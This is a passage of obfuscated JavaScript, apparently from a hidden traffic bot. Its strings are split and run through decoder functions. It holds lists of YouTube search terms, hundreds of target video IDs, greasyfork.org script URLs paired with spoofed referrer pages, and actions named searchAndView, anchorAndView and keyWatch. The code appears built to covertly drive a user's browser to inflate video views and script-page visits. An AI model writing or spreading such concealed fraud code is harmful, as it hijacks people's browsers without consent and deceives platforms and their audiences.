'\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x53 * 0x4f + -0x1095 + -0x8fe)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x15f1 * 0x1 + 0x1ab9 + 0x2 * -0x25f)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x1d * -0x1 + -0x233 * -0x5 + -0xb19);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    V(0xd, '4]Jo') + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    U(0xf) + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    W(0x5) + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + U(0x9) + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + W(0xa) + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + W(0x7) + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
